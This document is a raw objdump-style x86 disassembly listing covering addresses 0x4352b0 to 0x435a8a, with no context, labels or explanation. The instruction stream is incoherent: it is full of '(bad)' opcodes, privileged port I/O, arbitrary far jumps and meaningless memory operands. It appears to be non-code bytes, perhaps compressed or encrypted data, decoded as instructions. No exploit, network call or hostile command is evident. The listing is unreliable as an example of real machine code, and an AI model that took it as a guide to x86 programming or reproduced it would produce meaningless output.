  4352b0:	push   ebx
  4352b1:	pop    ebx
  4352b2:	or     BYTE PTR [eax-0x62],dh
  4352b5:	xor    BYTE PTR [edx+0x34549620],bh
  4352bb:	mov    ds:0xbbacdb78,al
  4352c0:	test   ch,bh
  4352c2:	push   0x62090c21
  4352c7:	int3   
  4352c8:	or     bl,BYTE PTR [esi-0x36f05730]
  4352ce:	and    al,0x29
  4352d0:	pop    esi
  4352d1:	xchg   edi,eax
  4352d2:	jne    0x4352a3
  4352d4:	shl    BYTE PTR ds:0x1aea5cb2,cl
  4352da:	add    ch,bl
  4352dc:	adc    DWORD PTR [esi+0x48fe202e],edi
  4352e2:	sbb    eax,0x8e5f8b32
  4352e7:	jno    0x4352f9
  4352e9:	retf   0x5d34
  4352ec:	or     esi,DWORD PTR [ebx-0x72]
  4352ef:	addr16 jmp 0xb51fa455
  4352f5:	repnz xchg edi,eax
  4352f7:	test   DWORD PTR [esi-0x1eaa1229],ebx
  4352fd:	int3   
  4352fe:	push   edx
  4352ff:	and    al,0x94
  435301:	dec    ebx
  435302:	dec    esi
  435303:	or     bh,dh
  435305:	pusha  
  435306:	cmp    al,0x95
  435308:	xchg   ebx,eax
  435309:	out    0xb6,al
  43530b:	ja     0x4352be
  43530d:	push   esi
  43530e:	out    dx,al
  43530f:	(bad)  
  435310:	hlt    
  435311:	sub    ch,ch
  435313:	and    al,0x1a
  435315:	xor    ecx,ebp
  435317:	mov    al,ds:0x12a8d32f
  43531c:	adc    eax,edx
  43531e:	xchg   ebp,eax
  43531f:	(bad)  
  435320:	pop    esi
  435321:	fistp  QWORD PTR [ecx+0x6bdb6413]
  435327:	fimul  WORD PTR [edi-0x4f1e64a1]
  43532d:	pop    ss
  43532e:	jmp    0x3a3c:0x72707fbd
  435335:	mov    ecx,0x565e1ff8
  43533a:	adc    cl,BYTE PTR [ebx-0x1f]
  43533d:	xchg   ebp,eax
  43533e:	addr16 mov eax,ds:0x70e6
  435342:	fldenv [ebx+0x72]
  435345:	std    
  435346:	jecxz  0x435329
  435348:	pop    edi
  435349:	aaa    
  43534a:	mov    ds:0xb09a54a4,al
  43534f:	pusha  
  435350:	xchg   ebx,eax
  435351:	inc    esp
  435352:	(bad)  
  435353:	mov    al,ds:0xd1a51cac
  435358:	jl     0x435346
  43535a:	xchg   ecx,eax
  43535b:	push   ds
  43535c:	pop    esi
  43535d:	push   esi
  43535e:	(bad)  
  435360:	cmp    BYTE PTR [esi+eiz*1-0x21],dh
  435364:	out    dx,eax
  435365:	push   ebp
  435366:	add    eax,0x3aefa025
  43536c:	fist   DWORD PTR [edx+eiz*8+0x70]
  435370:	pop    eax
  435371:	fdivr  QWORD PTR [ebx*8-0x7dc158a2]
  435378:	mov    ecx,0x6c9e7d4f
  43537d:	pusha  
  43537e:	sub    bl,BYTE PTR [edi-0x7c]
  435381:	call   0x8820:0x752153bb
  435388:	shl    eax,1
  43538a:	push   ebp
  43538b:	ds xor eax,0x14ab7456
  435391:	pop    edx
  435392:	xor    dh,bh
  435394:	(bad)  
  435395:	fcom   QWORD PTR [esi]
  435397:	jb     0x435325
  435399:	in     eax,0xb2
  43539b:	fs jb  0x435347
  43539e:	out    dx,al
  43539f:	rcl    BYTE PTR [esi+0x1ebdf4ff],cl
  4353a5:	sbb    BYTE PTR [ecx-0xc],0x1a
  4353a9:	popa   
  4353aa:	test   DWORD PTR [ebx],ebx
  4353ac:	in     eax,0xf1
  4353ae:	mov    DWORD PTR [edi-0x1d111d25],eax
  4353b4:	popa   
  4353b5:	mov    bh,0x5a
  4353b7:	shl    DWORD PTR [esi+0x39],cl
  4353ba:	sbb    esp,DWORD PTR [ecx+0x67e1cd4f]
  4353c0:	xchg   ecx,eax
  4353c1:	(bad)  [eax+0x6763c7]
  4353c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4353c8:	add    BYTE PTR [eax-0x382c2dfe],ah
  4353ce:	inc    esi
  4353cf:	(bad)  
  4353d0:	adc    BYTE PTR [ecx-0x2d],ah
  4353d3:	jmp    0x17d1:0x13042774
  4353da:	in     eax,dx
  4353db:	ins    DWORD PTR es:[edi],dx
  4353dc:	in     eax,0x10
  4353de:	cmp    eax,0x2e6740e6
  4353e3:	leave  
  4353e4:	sbb    BYTE PTR [edi-0x3e],0xad
  4353e8:	mov    ch,al
  4353ea:	sub    dl,al
  4353ec:	dec    ecx
  4353ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4353ee:	jne    0x435424
  4353f0:	pop    esi
  4353f1:	mov    ds:0x3490d615,al
  4353f6:	retf   
  4353f7:	xchg   ecx,eax
  4353f8:	push   ss
  4353f9:	popa   
  4353fa:	mov    ecx,DWORD PTR [ebp-0x33f73f34]
  435400:	(bad)  
  435402:	out    dx,al
  435403:	add    al,0x50
  435405:	call   0x5b12f494
  43540a:	sbb    al,0xa8
  43540c:	stc    
  43540d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43540e:	jge    0x43541f
  435410:	into   
  435411:	adc    BYTE PTR [ebx+0x8],bl
  435414:	add    eax,0x690002b3
  435419:	jmp    0x4353c9
  43541b:	in     eax,dx
  43541c:	mov    cl,0x68
  43541e:	or     al,0x70
  435420:	(bad)  
  435421:	je     0x4353ab
  435423:	xchg   esp,eax
  435424:	sahf   
  435425:	push   ecx
  435426:	xor    al,al
  435428:	fisubr WORD PTR [ebp+0x23]
  43542b:	mov    dh,0xb6
  43542d:	leave  
  43542e:	jmp    0x544a3084
  435433:	fcmovu st,st(6)
  435435:	aaa    
  435436:	call   0xcff4554f
  43543b:	push   0xecd4649d
  435440:	fidiv  WORD PTR [ecx+0x753f8888]
  435446:	and    eax,eax
  435448:	pop    esi
  435449:	cmp    edx,esi
  43544b:	dec    edx
  43544c:	dec    eax
  43544d:	jp     0x43546b
  43544f:	iret   
  435450:	lahf   
  435451:	pop    ecx
  435452:	ret    0x17f0
  435455:	jbe    0x435479
  435457:	xor    al,0xa3
  435459:	clc    
  43545a:	callw  0x65a8
  43545e:	push   edx
  43545f:	jle    0x4354c5
  435461:	nop
  435462:	fwait
  435463:	or     BYTE PTR [ebx+0x21],ah
  435466:	xor    BYTE PTR [eax-0x14],dl
  435469:	and    BYTE PTR [ecx+eiz*4],bh
  43546c:	scas   al,BYTE PTR es:[edi]
  43546d:	cmp    eax,DWORD PTR [edx+0x2f]
  435470:	addr16 push ecx
  435472:	cmp    cl,dl
  435474:	arpl   WORD PTR [ebp-0x6d],bp
  435477:	cmpps  xmm0,XMMWORD PTR [eax],0xea
  43547b:	adc    DWORD PTR [edi+eax*2+0x41],esp
  43547f:	lahf   
  435480:	sbb    eax,DWORD PTR [esi+0x1f91fea9]
  435486:	bound  ecx,QWORD PTR [ebp+0x693fcec5]
  43548c:	sbb    dl,0xa
  43548f:	adc    esp,edi
  435491:	xchg   ebp,eax
  435492:	in     al,dx
  435493:	push   bp
  435495:	ret    0x614e
  435498:	push   ds
  435499:	js     0x4354cb
  43549b:	in     eax,dx
  43549c:	jns    0x435452
  43549e:	in     al,0xa3
  4354a0:	inc    ebx
  4354a1:	mov    WORD PTR [ebx+0x6632b758],ds
  4354a7:	dec    ebp
  4354a8:	sbb    ebx,DWORD PTR [edi]
  4354aa:	out    dx,al
  4354ab:	rcl    BYTE PTR [edx+0x4],1
  4354ae:	cmp    al,0x6c
  4354b0:	xor    eax,0x789feac7
  4354b5:	jge    0x435524
  4354b7:	out    dx,al
  4354b8:	push   ds
  4354b9:	adc    eax,0x35fa4249
  4354be:	repz loope 0x43550e
  4354c1:	or     ecx,DWORD PTR [ecx+eiz*1+0x44529f3c]
  4354c8:	je     0x43552a
  4354ca:	sbb    DWORD PTR [ecx+0x52],0x601f47a4
  4354d1:	stos   BYTE PTR es:[edi],al
  4354d2:	jmp    0x435480
  4354d4:	fwait
  4354d5:	ins    BYTE PTR es:[edi],dx
  4354d6:	xor    al,0x5a
  4354d8:	pop    ss
  4354d9:	add    DWORD PTR [ebp+ebx*1+0x21bd607e],ecx
  4354e0:	and    BYTE PTR ds:[edx],dl
  4354e3:	jns    0x435468
  4354e5:	adc    esi,ebp
  4354e7:	or     edi,eax
  4354e9:	and    eax,0xd4b156cf
  4354ee:	pop    ebx
  4354ef:	mov    eax,ds:0x3e298f5a
  4354f4:	test   DWORD PTR [esi],ebx
  4354f6:	inc    eax
  4354f7:	enter  0x465e,0xe7
  4354fb:	dec    eax
  4354fc:	div    DWORD PTR [ecx+0x60b37ce6]
  435502:	xor    eax,0xfe6bd50
  435507:	pop    edi
  435508:	aad    0x43
  43550a:	out    dx,al
  43550b:	cmp    dh,BYTE PTR [edi+0x3c]
  43550e:	iret   
  43550f:	push   0xffffffd7
  435511:	inc    edx
  435512:	xchg   DWORD PTR [ecx+0x67b35380],esp
  435518:	out    dx,al
  435519:	loop   0x435541
  43551b:	mov    edi,0xc5356d5e
  435520:	or     bl,dh
  435522:	test   DWORD PTR [eax],edi
  435524:	inc    ecx
  435525:	push   edx
  435526:	jno    0x435586
  435528:	jno    0x4354d1
  43552a:	dec    esp
  43552b:	add    eax,0x544e222b
  435530:	arpl   WORD PTR [ebp-0x1],cx
  435533:	rcl    DWORD PTR [edi-0x65],0xae
  435537:	aas    
  435538:	jbe    0x4355a0
  43553a:	js     0x4354d6
  43553c:	fsub   DWORD PTR [eax+0x43]
  43553f:	jns    0x43555c
  435541:	inc    edx
  435542:	inc    ecx
  435543:	scas   eax,DWORD PTR es:[edi]
  435544:	cmp    edi,DWORD PTR [ebp-0x4e]
  435547:	leave  
  435548:	mov    al,ds:0xb6515e2b
  43554d:	into   
  43554e:	push   eax
  43554f:	icebp  
  435550:	pop    esi
  435551:	push   eax
  435552:	add    BYTE PTR [ebx],bh
  435554:	cmp    al,0xa1
  435556:	je     0x435529
  435558:	push   ebx
  435559:	jns    0x4354f8
  43555b:	scas   al,BYTE PTR es:[edi]
  43555c:	outs   dx,DWORD PTR ds:[esi]
  43555d:	pusha  
  43555e:	xor    esi,DWORD PTR [esi-0x64bd4280]
  435564:	clc    
  435565:	in     eax,dx
  435566:	out    dx,al
  435567:	push   cs
  435568:	pop    ebp
  435569:	(bad)  
  43556a:	jg     0x4355e9
  43556c:	sahf   
  43556d:	jge    0x435533
  43556f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  435570:	pop    ecx
  435571:	js     0x435575
  435573:	mov    dl,0x30
  435575:	mov    eax,ds:0x11716240
  43557a:	out    dx,al
  43557b:	mov    ch,0x34
  43557d:	mov    bl,0x60
  43557f:	sub    DWORD PTR [ecx+0x3a0cebb],esp
  435585:	push   0x45
  435587:	dec    esp
  435588:	fucom  st(2)
  43558a:	mov    ecx,0x8ffa3793
  43558f:	mov    eax,ds:0x464f55fd
  435594:	adc    edx,DWORD PTR [eax]
  435596:	or     dl,BYTE PTR [ecx]
  435598:	fistp  DWORD PTR [ebp-0x6b]
  43559b:	mov    ds:0xe7842dba,eax
  4355a0:	ret    
  4355a1:	lahf   
  4355a2:	test   eax,0x41a0e082
  4355a7:	in     al,0x5e
  4355a9:	aam    0x43
  4355ab:	retf   
  4355ac:	xchg   ebx,eax
  4355ad:	mov    gs,WORD PTR [eax-0x6a]
  4355b0:	jmp    0xc8bd2715
  4355b5:	shr    BYTE PTR [esi-0x69],1
  4355b8:	mov    ebx,0xbcb3ee3e
  4355bd:	push   ebp
  4355be:	xchg   ebx,eax
  4355bf:	xchg   ebx,eax
  4355c0:	pop    ds
  4355c1:	ins    BYTE PTR es:[edi],dx
  4355c2:	mov    dl,0xac
  4355c4:	adc    ecx,eax
  4355c6:	in     eax,0xf5
  4355c8:	or     eax,0xdb61e360
  4355cd:	fstp   QWORD PTR [esi+0x6d]
  4355d0:	rol    DWORD PTR [esi+edi*8-0x3dab099a],0xfb
  4355d8:	test   BYTE PTR [edx+0x65],dl
  4355db:	mov    cl,0xd9
  4355dd:	mov    al,ds:0x3ad3d37d
  4355e2:	cmp    DWORD PTR [ecx-0x47e76898],esp
  4355e8:	pop    ss
  4355e9:	inc    ecx
  4355ea:	sti    
  4355eb:	imul   ch
  4355ed:	inc    ebp
  4355ee:	and    ebx,DWORD PTR [edi+0xe]
  4355f1:	loope  0x435636
  4355f3:	cdq    
  4355f4:	sbb    ebp,DWORD PTR [esi+0x606a5759]
  4355fa:	jmp    DWORD PTR [edx-0x5e10562a]
  435600:	fistp  QWORD PTR [esi]
  435602:	out    0xec,eax
  435604:	bound  edx,QWORD PTR [ecx-0x50]
  435607:	mov    ch,0xdf
  435609:	or     edi,eax
  43560b:	sub    ecx,DWORD PTR [ecx]
  43560d:	rol    ebx,0x28
  435610:	mov    ch,0x60
  435612:	bound  eax,QWORD PTR [edi]
  435614:	add    ebx,DWORD PTR [ebx]
  435616:	adc    al,0xaf
  435618:	hlt    
  435619:	aad    0xeb
  43561b:	retf   0xb285
  43561e:	bnd jp 0x435665
  435621:	xchg   esi,eax
  435622:	leave  
  435623:	sub    ch,bh
  435625:	cmp    ch,BYTE PTR [esi-0x5f]
  435628:	es cld 
  43562a:	loope  0x43562f
  43562c:	in     eax,dx
  43562d:	push   esi
  43562e:	retf   0x5e17
  435631:	adc    eax,0x41e8b0b5
  435636:	push   ss
  435637:	add    DWORD PTR [eax+edx*8-0xd986153],0x8a6059d5
  435642:	lahf   
  435643:	sub    bh,dh
  435645:	sti    
  435646:	imul   eax,DWORD PTR [ecx-0x4a],0x554bee73
  43564d:	push   edi
  43564e:	bound  esp,QWORD PTR [ebx+0x23]
  435651:	jnp    0x43561c
  435653:	jo     0x435668
  435655:	popa   
  435656:	das    
  435657:	inc    esi
  435658:	dec    ecx
  435659:	xchg   edi,eax
  43565a:	mov    dl,0x14
  43565c:	retf   
  43565d:	das    
  43565e:	out    dx,al
  43565f:	adc    al,BYTE PTR [eax-0x69404a1d]
  435665:	inc    ebx
  435666:	push   ds
  435667:	mov    eax,ds:0x142c262c
  43566c:	dec    edi
  43566d:	(bad)  
  43566e:	or     ebp,DWORD PTR [ecx]
  435670:	pop    edi
  435671:	xchg   DWORD PTR [esp],edi
  435674:	div    BYTE PTR [ebp+0x37]
  435677:	sub    ch,BYTE PTR [ebx-0x3183adf6]
  43567d:	pop    ebp
  43567e:	ins    BYTE PTR es:[edi],dx
  43567f:	lock add al,0x71
  435682:	nop
  435683:	pusha  
  435684:	fld    TBYTE PTR [ecx]
  435686:	fsub   DWORD PTR [eax]
  435688:	mov    edx,0x5e5e9894
  43568d:	ss xchg bh,ch
  435690:	jl     0x43562a
  435692:	add    eax,0xb260d0a4
  435697:	ret    0x279f
  43569a:	pop    edx
  43569b:	or     eax,0x3a4cc07d
  4356a0:	inc    ecx
  4356a1:	ins    DWORD PTR es:[edi],dx
  4356a2:	scas   eax,DWORD PTR es:[edi]
  4356a3:	hlt    
  4356a4:	ficomp WORD PTR [edi+0x77]
  4356a7:	in     al,dx
  4356a8:	loope  0x435704
  4356aa:	push   ebp
  4356ab:	push   ebp
  4356ac:	add    BYTE PTR ds:0xdeefe2f4,0xf5
  4356b3:	divps  xmm3,XMMWORD PTR [eax-0x56225a9c]
  4356ba:	inc    eax
  4356bb:	mov    eax,ds:0xd4b85646
  4356c0:	xchg   ebp,eax
  4356c1:	jnp    0x4356c2
  4356c3:	rcr    DWORD PTR [edi-0x7e],1
  4356c6:	inc    edx
  4356c7:	cmc    
  4356c8:	stos   BYTE PTR es:[edi],al
  4356c9:	inc    edx
  4356ca:	inc    esi
  4356cb:	dec    ecx
  4356cc:	(bad)  
  4356cd:	jne    0x435681
  4356cf:	mov    al,ds:0x1c1f65fc
  4356d4:	pop    edi
  4356d5:	inc    DWORD PTR [ebx+0x26]
  4356d8:	pop    ebx
  4356d9:	fstp   DWORD PTR [eax+ebp*4+0x6b]
  4356dd:	(bad)  
  4356de:	jle    0x4356de
  4356e0:	aam    0xba
  4356e2:	imul   esp,DWORD PTR [ecx+0x9c25cef],0xfffffffe
  4356e9:	or     al,BYTE PTR [esi+0x18]
  4356ec:	pop    ebp
  4356ed:	out    0xab,al
  4356ef:	mov    dh,0x5c
  4356f1:	sbb    edx,esi
  4356f3:	mov    al,0x82
  4356f5:	mov    edx,0x60b1299d
  4356fa:	push   0xe1c49eb
  4356ff:	push   edx
  435700:	dec    ebp
  435701:	jge    0x4356fa
  435703:	dec    esp
  435704:	push   edx
  435705:	xchg   esi,eax
  435706:	jmp    0x435706
  435708:	shl    ah,1
  43570a:	imul   esi,DWORD PTR [ecx],0xffffffe7
  43570d:	mov    ebp,0xa10ba0dd
  435712:	rcr    BYTE PTR [eax+0x5b],0xba
  435716:	test   al,0xd8
  435718:	jmp    0x43575b
  43571a:	out    dx,al
  43571b:	mov    ebx,0x227cf3bb
  435720:	(bad)  
  435721:	int    0xc1
  435723:	mov    al,ds:0xfbb723ab
  435728:	mov    ecx,eax
  43572a:	pop    esp
  43572b:	mov    dh,0x5b
  43572d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43572e:	fild   QWORD PTR ds:0xe8fe9375
  435734:	sar    BYTE PTR [edx+0x3f],cl
  435737:	jae    0x435796
  435739:	das    
  43573a:	xor    ch,BYTE PTR [edi+0x706ba327]
  435740:	arpl   WORD PTR [ecx-0x35],di
  435743:	adc    BYTE PTR [esi-0x1d],dh
  435746:	popa   
  435747:	cmp    DWORD PTR [edx],edx
  435749:	xchg   esp,eax
  43574a:	mov    al,ds:0xf47a56a1
  43574f:	hlt    
  435750:	or     ecx,esp
  435752:	adc    DWORD PTR [edi-0x1c18dd41],ebx
  435758:	fsubp  st(5),st
  43575a:	xchg   ecx,eax
  43575b:	add    esp,DWORD PTR [edx+eax*1]
  43575e:	out    dx,al
  43575f:	sbb    DWORD PTR [ebx-0x51a5e27b],ecx
  435765:	les    esi,FWORD PTR [ebx-0x5f]
  435768:	cwde   
  435769:	jg     0x4357a9
  43576b:	(bad)  
  43576c:	rcl    BYTE PTR [edi+ebx*8-0x31],1
  435770:	(bad)  
  435771:	mov    esi,gs
  435773:	mov    eax,0x1cca1207
  435778:	lea    eax,[esi+0x692ceb28]
  43577e:	push   edi
  43577f:	aas    
  435780:	ficom  WORD PTR [esp+edi*2+0x39711860]
  435787:	add    dl,BYTE PTR [edx-0x5c]
  43578a:	test   al,0xd3
  43578c:	push   ds
  43578d:	repnz daa 
  43578f:	imul   di,dx,0x21
  435793:	mov    edi,0xa0c181c5
  435798:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  435799:	sub    edx,DWORD PTR [edi-0x11467acd]
  43579f:	outs   dx,DWORD PTR ds:[esi]
  4357a0:	cmp    eax,0x6ff0eaa6
  4357a5:	outs   dx,DWORD PTR ds:[esi]
  4357a6:	adc    esp,DWORD PTR [ecx-0x61e51ded]
  4357ac:	push   0xffffffbf
  4357ae:	xchg   esi,eax
  4357af:	or     DWORD PTR [eax-0x3],esp
  4357b2:	test   eax,0x618caaa
  4357b7:	lock pop esi
  4357b9:	mov    eax,ds:0x962bc62f
  4357be:	out    dx,al
  4357bf:	or     eax,0xf482b578
  4357c4:	mov    WORD PTR [edi+ebx*4],bx
  4357c8:	jge    0x43579d
  4357ca:	jo     0x435829
  4357cc:	(bad)  
  4357cd:	out    dx,al
  4357ce:	sub    al,0xbe
  4357d0:	jle    0x435780
  4357d2:	out    dx,al
  4357d3:	mov    cl,BYTE PTR [edx]
  4357d5:	fcmovbe st,st(2)
  4357d7:	lods   al,BYTE PTR ds:[esi]
  4357d8:	aas    
  4357d9:	retf   
  4357da:	lods   al,BYTE PTR ds:[esi]
  4357db:	in     al,dx
  4357dc:	std    
  4357dd:	sub    esi,DWORD PTR [edx-0x5f]
  4357e0:	jae    0x435841
  4357e2:	jg     0x43581f
  4357e4:	lods   eax,DWORD PTR ds:[esi]
  4357e5:	and    DWORD PTR [esi-0x41],eax
  4357e8:	pop    ecx
  4357e9:	(bad)  
  4357ea:	repz retf 
  4357ec:	imul   esp,DWORD PTR [edx+0x27],0x9b3ade69
  4357f3:	loopne 0x4357a6
  4357f5:	pusha  
  4357f6:	loope  0x435865
  4357f8:	in     al,dx
  4357f9:	and    BYTE PTR ds:[ebx+eax*8+0x5c1786b5],0x3c
  435802:	rol    BYTE PTR [edi+0x1f],0x31
  435806:	bound  ebx,QWORD PTR [edi-0xcf48847]
  43580c:	fimul  WORD PTR [edi+0x4ed20bce]
  435812:	out    dx,al
  435813:	scas   al,BYTE PTR es:[edi]
  435814:	pusha  
  435815:	pop    ebp
  435816:	mov    ebp,DWORD PTR [eax]
  435818:	pop    ebx
  435819:	test   al,0xab
  43581b:	mov    al,ds:0x53d529dc
  435820:	xchg   esi,eax
  435821:	push   edi
  435822:	jmp    DWORD PTR [ecx+0x5f]
  435825:	mov    ebp,0x8180ba61
  43582a:	hlt    
  43582b:	and    BYTE PTR [ebx],ah
  43582d:	pop    edi
  43582e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43582f:	mov    eax,ds:0x9fcee2d
  435834:	jle    0x435887
  435836:	test   BYTE PTR [esp+eax*4+0x5720ee84],al
  43583d:	mov    ebp,0x163bf1e4
  435842:	dec    edi
  435843:	lods   al,BYTE PTR ds:[esi]
  435844:	sub    BYTE PTR [edx],al
  435846:	out    dx,al
  435847:	gs jne 0x43584c
  43584a:	xchg   ecx,eax
  43584b:	adc    BYTE PTR [edx-0x44ae1415],bh
  435851:	pop    ebx
  435852:	mov    esp,0x5bf1243b
  435857:	fs pushf 
  435859:	inc    esp
  43585a:	xchg   edx,eax
  43585b:	mul    cl
  43585d:	out    0x63,eax
  43585f:	test   al,0xe
  435861:	imul   esp,DWORD PTR [esi+0x3a1fb0d7],0x2f
  435868:	mov    WORD PTR [eax+0x4a5ebf50],cs
  43586e:	push   esi
  43586f:	jo     0x4358d0
  435871:	popf   
  435872:	in     eax,dx
  435873:	enter  0x60e8,0xdd
  435877:	mov    DWORD PTR [edx-0x4f224493],eax
  43587d:	or     ch,dh
  43587f:	jb     0x435858
  435881:	cdq    
  435882:	dec    esp
  435883:	das    
  435884:	adc    ecx,ebp
  435886:	fld    TBYTE PTR [eax]
  435888:	jb     0x4358ea
  43588a:	mov    ?,WORD PTR [eax+0x58]
  43588d:	lods   al,BYTE PTR ds:[esi]
  43588e:	out    dx,eax
  43588f:	test   eax,0x74eef795
  435894:	sti    
  435895:	push   ebx
  435896:	scas   eax,DWORD PTR es:[edi]
  435897:	mov    ah,0x28
  435899:	aas    
  43589a:	arpl   WORD PTR [ecx-0x239965b],sp
  4358a0:	in     eax,0xc8
  4358a2:	mov    eax,0x59ce5ecc
  4358a7:	cli    
  4358a8:	not    bl
  4358aa:	fstp   QWORD PTR [edx+0x30]
  4358ad:	popa   
  4358ae:	aas    
  4358af:	dec    DWORD PTR [ebp+0x1c]
  4358b2:	into   
  4358b3:	cmc    
  4358b4:	arpl   bx,cx
  4358b6:	in     eax,dx
  4358b7:	cmp    dl,0xd2
  4358ba:	jl     0x435933
  4358bc:	inc    ebx
  4358bd:	outs   dx,BYTE PTR ds:[esi]
  4358be:	dec    esi
  4358bf:	and    DWORD PTR cs:[ecx+0x49],esp
  4358c3:	into   
  4358c4:	inc    edi
  4358c5:	mov    al,0xb8
  4358c7:	dec    esp
  4358c8:	mov    eax,edx
  4358ca:	in     eax,dx
  4358cb:	mov    DWORD PTR [ebx],ecx
  4358cd:	xchg   BYTE PTR [esi+0x60],ch
  4358d0:	sbb    ecx,eax
  4358d2:	pop    edx
  4358d3:	je     0x435946
  4358d5:	push   ecx
  4358d6:	fnop   
  4358d8:	inc    eax
  4358d9:	mov    BYTE PTR [esi],ch
  4358db:	arpl   cx,sp
  4358dd:	jae    0x4358ca
  4358df:	retf   0x984a
  4358e2:	push   ebp
  4358e3:	les    esp,FWORD PTR [esi-0x1c0895a0]
  4358e9:	adc    ecx,ebx
  4358eb:	or     DWORD PTR [eax+edx*1+0x64b85f14],ecx
  4358f2:	xchg   DWORD PTR [ebx-0x27],esp
  4358f5:	into   
  4358f6:	mov    ah,0x3d
  4358f8:	xchg   esp,eax
  4358f9:	popf   
  4358fa:	loopne 0x4358c2
  4358fc:	mov    esi,0x5e0f1096
  435901:	in     al,0x48
  435903:	fadd   DWORD PTR [esi+ecx*4+0x312b29ac]
  43590a:	aaa    
  43590b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43590c:	pop    ax
  43590e:	outs   dx,BYTE PTR ds:[esi]
  43590f:	pop    es
  435910:	fldcw  WORD PTR [ebp-0x7f4b64a3]
  435916:	adc    DWORD PTR [edi],0x1d1d825f
  43591c:	mov    bh,0xa5
  43591e:	cmp    al,BYTE PTR [ecx+0x1f]
  435921:	mov    ah,0x98
  435923:	mul    DWORD PTR [edi]
  435925:	popa   
  435926:	push   0xffffffd4
  435928:	scas   eax,DWORD PTR es:[edi]
  435929:	push   eax
  43592a:	xor    edi,DWORD PTR [ebx]
  43592c:	std    
  43592d:	sub    dh,0x7f
  435930:	mov    esi,0xc4ae0ffc
  435935:	lods   eax,DWORD PTR ds:[esi]
  435936:	jecxz  0x4358d9
  435938:	xchg   BYTE PTR ds:0x8b61f600,cl
  43593e:	xor    al,0x81
  435940:	aaa    
  435941:	inc    ecx
  435942:	out    dx,al
  435943:	pushf  
  435944:	div    BYTE PTR [ebp-0x56df0dbd]
  43594a:	mov    dh,0x84
  43594c:	jge    0x4359ae
  43594e:	out    0x6,eax
  435950:	mov    al,0x7e
  435952:	fsub   QWORD PTR [ecx-0x3b]
  435955:	cli    
  435956:	out    dx,al
  435957:	xlat   BYTE PTR ds:[ebx]
  435958:	lods   eax,DWORD PTR ds:[esi]
  435959:	push   ebp
  43595a:	ret    0x43cb
  43595d:	and    eax,0xbc5c9347
  435962:	frstor [eax+0x5b1853aa]
  435968:	jmp    0x43597e
  43596a:	fcmovu st,st(7)
  43596c:	jp     0x435953
  43596e:	ret    0xfb0
  435971:	pop    edx
  435972:	sub    eax,0xbeb134da
  435977:	aaa    
  435978:	xor    BYTE PTR [ebx-0x72],al
  43597b:	mov    eax,ds:0xbac6fa36
  435980:	sub    eax,0x323bbab6
  435985:	pop    esi
  435986:	jb     0x4359a9
  435988:	add    DWORD PTR [ebx],edx
  43598a:	fwait
  43598b:	fwait
  43598c:	mov    al,ds:0x79a0bcd0
  435991:	repz or DWORD PTR [ecx],0xf3fd46a3
  435998:	pop    esi
  435999:	pushf  
  43599a:	sbb    eax,0xdfbc71e4
  43599f:	imul   eax,DWORD PTR [esi+0x61],0x6b36e93d
  4359a6:	adc    BYTE PTR [ebx+edx*8+0x1972e90b],dl
  4359ad:	sub    al,0xc4
  4359af:	loopne 0x43594f
  4359b1:	lahf   
  4359b2:	sub    dh,BYTE PTR [ebp+ebx*4-0x42]
  4359b6:	icebp  
  4359b7:	mov    esp,0xa3a4c54b
  4359bc:	and    cl,BYTE PTR [ebp-0x1f764720]
  4359c2:	adc    cl,BYTE PTR [eax-0x5ef8b51b]
  4359c8:	int    0x21
  4359ca:	call   0x5e73:0x92d22f81
  4359d1:	ret    0xed6c
  4359d4:	xor    DWORD PTR [eax+0x2e],eax
  4359d7:	out    dx,eax
  4359d8:	xor    BYTE PTR [esp+edi*8-0x61],al
  4359dc:	mov    ch,0xa0
  4359de:	sbb    ch,BYTE PTR [ecx+0x74]
  4359e1:	dec    ecx
  4359e2:	outs   dx,BYTE PTR ds:[esi]
  4359e3:	ss pusha 
  4359e5:	jp     0x435a43
  4359e7:	ins    DWORD PTR es:[edi],dx
  4359e8:	push   ds
  4359e9:	xchg   ebp,eax
  4359ea:	inc    eax
  4359eb:	adc    DWORD PTR [esi-0x335c6c44],0xab4d55bf
  4359f5:	jnp    0x4359a4
  4359f7:	retf   0x8cf5
  4359fa:	shr    ch,1
  4359fc:	pop    esi
  4359fd:	lds    ebp,FWORD PTR [esi]
  4359ff:	push   0x750c5370
  435a04:	sbb    eax,0xc4fda961
  435a09:	aam    0xb
  435a0b:	in     eax,dx
  435a0c:	mov    ah,0xcf
  435a0e:	out    dx,al
  435a0f:	dec    esi
  435a10:	sub    DWORD PTR [ecx+edx*1+0x72],esp
  435a14:	cmp    eax,0x8da0fbfb
  435a19:	dec    esi
  435a1a:	js     0x435a69
  435a1c:	push   ecx
  435a1d:	mov    al,ds:0x865e0bd3
  435a22:	ja     0x4359a4
  435a24:	repnz cld 
  435a26:	inc    esp
  435a27:	mov    ds:0x10366136,eax
  435a2c:	mov    ds:0x5d14b065,al
  435a31:	dec    esp
  435a32:	lock add bl,bh
  435a35:	retf   0x4e38
  435a38:	pop    esi
  435a39:	mov    edx,0xa0b09ab9
  435a3e:	das    
  435a3f:	mov    eax,ds:0x37d6c86a
  435a44:	les    esi,FWORD PTR ds:0x9f5b14c1
  435a4a:	mov    eax,ds:0x1e06f2c7
  435a4f:	jnp    0x435a1c
  435a51:	lods   al,BYTE PTR ds:[esi]
  435a52:	jne    0x4359f5
  435a54:	pop    edx
  435a55:	test   al,0x9
  435a57:	sub    DWORD PTR [edx+0x5eeb0c19],esi
  435a5d:	xlat   BYTE PTR ds:[ebx]
  435a5e:	imul   ebx,DWORD PTR [edx-0x3ae50988],0xffffffca
  435a65:	pusha  
  435a66:	mov    edi,DWORD PTR [ecx-0x2fea078c]
  435a6c:	cwde   
  435a6d:	call   0x614fcd34
  435a72:	and    eax,0xc0545d66
  435a77:	repnz stc 
  435a79:	pusha  
  435a7a:	shl    BYTE PTR [eax+0x2c],cl
  435a7d:	mov    edx,0xc8678272
  435a82:	out    dx,al
  435a83:	lods   al,BYTE PTR ds:[esi]
  435a84:	add    eax,DWORD PTR [esi]
  435a86:	mov    dh,0x86
  435a88:	pop    ecx
  435a89:	scas   eax,DWORD PTR es:[edi]
  435a8a:	mov    ah,0x9e
